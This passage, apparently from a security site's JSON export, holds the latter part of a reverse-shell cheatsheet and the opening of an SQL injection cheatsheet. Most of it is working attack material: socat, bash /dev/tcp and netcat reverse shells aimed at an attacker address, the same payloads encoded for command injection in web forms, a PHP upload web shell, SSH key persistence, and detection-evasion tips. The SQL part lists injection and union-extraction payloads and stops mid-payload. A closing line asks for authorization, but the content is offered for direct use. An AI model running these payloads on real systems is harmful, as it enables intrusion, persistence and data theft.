class=\"n\"\u003e50\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e            \u003c/span\u003e\u003cspan class=\"k\"\u003etry\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"p\"\u003e{\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e                \u003c/span\u003e\u003cspan class=\"n\"\u003ep\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003eexitValue\u003c/span\u003e\u003cspan class=\"p\"\u003e();\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e                \u003c/span\u003e\u003cspan class=\"k\"\u003ebreak\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e            \u003c/span\u003e\u003cspan class=\"p\"\u003e}\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"k\"\u003ecatch\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eException\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"n\"\u003ee\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"p\"\u003e{}\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e        \u003c/span\u003e\u003cspan class=\"p\"\u003e}\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e        \u003c/span\u003e\u003cspan class=\"n\"\u003ep\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003edestroy\u003c/span\u003e\u003cspan class=\"p\"\u003e();\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e        \u003c/span\u003e\u003cspan class=\"n\"\u003es\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003eclose\u003c/span\u003e\u003cspan class=\"p\"\u003e();\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e    \u003c/span\u003e\u003cspan class=\"p\"\u003e}\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e\u003c/span\u003e\u003cspan class=\"p\"\u003e}\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003chr\u003e\n\u003ch2 id=\"shell-stabilization\"\u003eShell Stabilization\u003c/h2\u003e\n\u003ch3 id=\"tty-upgrade\"\u003eTTY Upgrade\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Python PTY\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003epython -c \u003cspan class=\"s1\"\u003e\u0026#39;import pty; pty.spawn(\u0026#34;/bin/bash\u0026#34;)\u0026#39;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003epython3 -c \u003cspan class=\"s1\"\u003e\u0026#39;import pty; pty.spawn(\u0026#34;/bin/bash\u0026#34;)\u0026#39;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Background the shell\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eCTRL + Z\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Set raw mode and foreground\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003estty raw -echo\u003cspan class=\"p\"\u003e;\u003c/span\u003e \u003cspan class=\"nb\"\u003efg\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Set terminal environment\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003eexport\u003c/span\u003e \u003cspan class=\"nv\"\u003eTERM\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003exterm\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Check screen size and set\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003estty -a \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003estty rows \u003cspan class=\"m\"\u003e28\u003c/span\u003e cols \u003cspan class=\"m\"\u003e110\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"alternative-tty-methods\"\u003eAlternative TTY Methods\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Using script\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003escript -qc /bin/bash /dev/null\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Using socat (if available on target)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003esocat exec:\u003cspan class=\"s1\"\u003e\u0026#39;bash -li\u0026#39;\u003c/span\u003e,pty,stderr,setsid,sigint,sane tcp:10.10.14.13:9001\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Using expect\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eexpect -c \u003cspan class=\"s2\"\u003e\u0026#34;spawn /bin/bash; interact\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003chr\u003e\n\u003ch2 id=\"ssh-based-access\"\u003eSSH-Based Access\u003c/h2\u003e\n\u003ch3 id=\"sshpass-for-automated-ssh-login\"\u003esshpass for Automated SSH Login\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Install sshpass\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003esudo apt install sshpass\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# SSH with password (from extracted credentials)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003esshpass -p \u003cspan class=\"s1\"\u003e\u0026#39;PlayerOftheMatch2022\u0026#39;\u003c/span\u003e ssh player@10.10.11.194\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# SSH with password from file\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003eecho\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;password123\u0026#39;\u003c/span\u003e \u0026gt; /tmp/pass\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003esshpass -f /tmp/pass ssh user@target\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# SSH with password and command execution\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003esshpass -p \u003cspan class=\"s1\"\u003e\u0026#39;password\u0026#39;\u003c/span\u003e ssh user@target \u003cspan class=\"s1\"\u003e\u0026#39;whoami\u0026#39;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Disable host key checking for testing\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003esshpass -p \u003cspan class=\"s1\"\u003e\u0026#39;password\u0026#39;\u003c/span\u003e ssh -o \u003cspan class=\"nv\"\u003eStrictHostKeyChecking\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003eno user@target\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"ssh-key-based-access\"\u003eSSH Key-Based Access\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Use existing private key\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003essh -i /path/to/private_key user@target\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# SSH with specific key and no host checking\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003essh -i /path/to/key -o \u003cspan class=\"nv\"\u003eStrictHostKeyChecking\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003eno user@target\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Generate SSH key pair for persistence\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003essh-keygen -t rsa -f /tmp/key -N \u003cspan class=\"s2\"\u003e\u0026#34;\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Copy public key to target (if possible)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ecat /tmp/key.pub \u0026gt;\u0026gt; ~/.ssh/authorized_keys\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"shell-enhancement\"\u003eShell Enhancement\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Set environment variables\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003eexport\u003c/span\u003e \u003cspan class=\"nv\"\u003ePATH\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003eexport\u003c/span\u003e \u003cspan class=\"nv\"\u003eSHELL\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e/bin/bash\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003eexport\u003c/span\u003e \u003cspan class=\"nv\"\u003eHOME\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e/tmp\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Enable command history\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003eexport\u003c/span\u003e \u003cspan class=\"nv\"\u003eHISTFILE\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e/tmp/.bash_history\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Color prompt\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003eexport\u003c/span\u003e \u003cspan class=\"nv\"\u003ePS1\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;\\[\\033[01;32m\\]\\u@\\h\\[\\033[00m\\]:\\[\\033[01;34m\\]\\w\\[\\033[00m\\]\\$ \u0026#39;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003chr\u003e\n\u003ch2 id=\"web-application-payloads\"\u003eWeb Application Payloads\u003c/h2\u003e\n\u003ch3 id=\"command-injection-in-web-forms\"\u003eCommand Injection in Web Forms\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Basic command injection\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e bash -i \u0026gt;\u003cspan class=\"p\"\u003e\u0026amp;\u003c/span\u003e /dev/tcp/10.10.14.13/9001 0\u0026gt;\u003cspan class=\"p\"\u003e\u0026amp;\u003c/span\u003e\u003cspan class=\"m\"\u003e1\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# URL encoded\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e%3B%20bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.14.13%2F9001%200%3E%261\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# In JSON\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"o\"\u003e{\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;cmd\u0026#34;\u003c/span\u003e: \u003cspan class=\"s2\"\u003e\u0026#34;; bash -i \u0026gt;\u0026amp; /dev/tcp/10.10.14.13/9001 0\u0026gt;\u0026amp;1\u0026#34;\u003c/span\u003e\u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# As POST parameter\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003ecmd\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003ebash -c \u003cspan class=\"s1\"\u003e\u0026#39;bash -i /dev/tcp/10.10.14.13/9001 0\u0026gt;\u0026amp;1\u0026#39;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"file-upload-shells\"\u003eFile Upload Shells\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-php\" data-lang=\"php\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Simple PHP upload shell\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e\u003c/span\u003e\u003cspan class=\"o\"\u003e\u0026lt;?\u003c/span\u003e\u003cspan class=\"nx\"\u003ephp\u003c/span\u003e \u003cspan class=\"nx\"\u003esystem\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nv\"\u003e$_GET\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;cmd\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e]);\u003c/span\u003e \u003cspan class=\"cp\"\u003e?\u0026gt;\u003c/span\u003e\u003cspan class=\"err\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"err\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"err\"\u003e# Save as shell.php and upload, then access:\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"err\"\u003e# http://target.com/uploads/shell.php?cmd=nc -e /bin/bash 10.10.14.13 9001\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003chr\u003e\n\u003ch2 id=\"troubleshooting\"\u003eTroubleshooting\u003c/h2\u003e\n\u003ch3 id=\"common-issues\"\u003eCommon Issues\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# No netcat with -e flag\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003erm /tmp/f\u003cspan class=\"p\"\u003e;\u003c/span\u003emkfifo /tmp/f\u003cspan class=\"p\"\u003e;\u003c/span\u003ecat /tmp/f\u003cspan class=\"p\"\u003e|\u003c/span\u003e/bin/sh -i 2\u0026gt;\u003cspan class=\"p\"\u003e\u0026amp;\u003c/span\u003e1\u003cspan class=\"p\"\u003e|\u003c/span\u003enc 10.10.14.13 \u003cspan class=\"m\"\u003e9001\u003c/span\u003e \u0026gt;/tmp/f\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Firewall blocking outbound connections\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Try different ports: 80, 443, 53, 25\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003enc 10.10.14.13 \u003cspan class=\"m\"\u003e443\u003c/span\u003e -e /bin/bash\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Limited shell environment\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003eexport\u003c/span\u003e \u003cspan class=\"nv\"\u003ePATH\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# No interactive shell\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003epython -c \u003cspan class=\"s1\"\u003e\u0026#39;import pty; pty.spawn(\u0026#34;/bin/bash\u0026#34;)\u0026#39;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"testing-connectivity\"\u003eTesting Connectivity\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Test if target can reach your IP\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eping 10.10.14.13\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Test specific port\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003etelnet 10.10.14.13 \u003cspan class=\"m\"\u003e9001\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003enc -nv 10.10.14.13 \u003cspan class=\"m\"\u003e9001\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# DNS exfiltration test\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003enslookup test.yourdomain.com\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003chr\u003e\n\u003ch2 id=\"security-considerations\"\u003eSecurity Considerations\u003c/h2\u003e\n\u003ch3 id=\"operational-security\"\u003eOperational Security\u003c/h3\u003e\n\u003cul\u003e\n\u003cli\u003eUse encrypted channels when possible (HTTPS, SSH tunnels)\u003c/li\u003e\n\u003cli\u003eAvoid leaving artifacts on target systems\u003c/li\u003e\n\u003cli\u003eClean up uploaded files and temporary files\u003c/li\u003e\n\u003cli\u003eUse staging servers to avoid direct connections\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch3 id=\"detection-evasion\"\u003eDetection Evasion\u003c/h3\u003e\n\u003cul\u003e\n\u003cli\u003eUse common ports (80, 443, 53) to blend with normal traffic\u003c/li\u003e\n\u003cli\u003eImplement delays between connection attempts\u003c/li\u003e\n\u003cli\u003eUse domain names instead of IP addresses when possible\u003c/li\u003e\n\u003cli\u003eRotate source IP addresses if available\u003c/li\u003e\n\u003c/ul\u003e\n\u003chr\u003e\n\u003cp\u003e\u003cem\u003eAlways ensure you have proper authorization before deploying reverse shells on any target system. These techniques should only be used for legitimate security testing purposes.\u003c/em\u003e\u003c/p\u003e","title":"Reverse Shell Cheatsheet"},{"content":"SQL Injection Cheatsheet Test Workflow Identify entry points: parameters, headers, cookies, JSON bodies. Baseline request: repeat the request and capture the normal response for comparison. Break the query: start with a single quote ' or double quote \u0026quot; to look for syntax errors. Confirm injection: use logic tests such as AND 1=1 (true) vs AND 1=2 (false). Escalate: move from time-based to union-based or stacked queries depending on DBMS. Quick Payloads \u0026#39; OR \u0026#39;1\u0026#39;=\u0026#39;1\u0026#39; -- \u0026#34; OR \u0026#34;1\u0026#34;=\u0026#34;1\u0026#34; -- \u0026#39;) OR \u0026#39;1\u0026#39;=\u0026#39;1\u0026#39; -- admin\u0026#39; -- admin\u0026#39; # Numeric Context 1 OR 1=1 1 UNION ALL SELECT NULL 1 ORDER BY 5-- Boolean Tests 1 AND 1=1 1 AND SLEEP(5) 1 AND (SELECT 1 FROM pg_sleep(5)) Union Enumeration Count columns: ORDER BY 1, ORDER BY 2, increment until error. Match types: UNION ALL SELECT NULL,NULL etc. Extract data: replace NULL with payloads like @@version, database(), or current_user. 1 UNION ALL SELECT @@version, user() 1 UNION ALL SELECT NULL, table_name FROM information_schema.tables Time-Based Enumeration 1 AND SLEEP(5) 1 AND (SELECT 